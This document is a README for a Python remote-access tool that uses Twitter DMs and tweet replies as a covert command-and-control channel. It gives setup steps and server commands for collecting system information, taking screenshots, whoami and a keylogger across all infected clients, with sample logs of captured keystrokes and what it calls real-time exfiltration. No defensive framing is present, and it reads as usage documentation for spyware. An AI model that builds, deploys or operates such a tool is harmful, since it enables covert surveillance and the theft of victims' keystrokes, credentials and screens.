# Requirements
- Python 3.8+
- Libraries: tweepy, cryptography, Pillow, pynput
- Twitter API v2 credentials (Bearer Token, API Key, etc.)

## Setup
- Install Dependencies: `pip install tweepy cryptography Pillow pynput`
- Configure Credentials:
  - Replace placeholders in server.py and client.py with your Twitter API credentials.
  - Share the encryption key (key) between server and client.
# Usage
- Run Server:
  - python server.py
- Run Client:
  - python client.py

## Shell-Like Interaction examples
- server> `sysinfo`
  - Logs show responses like: Response from <client_id>: {'o': 'Windows', 'h': 'HOST1', 'i': '192.168.1.10'}
  - Target a specific client (replace <client_id> with actual ID from logs):
- server> `target:<client_id> screenshot`
  - Logs show chunked screenshot data.
- Start keylogger on all clients:
  - server> `keylogger_start`
  - Logs show keystrokes every 10 keys (e.g., Response from <client_id>: "hello[SPACE]world").
- View Responses:
  - Check server logs for real-time exfiltration from DMs or tweet replies.
- Additional Commands
  - whoami: Get client username.
  - get_memory key=last_dir: Retrieve in-memory data.
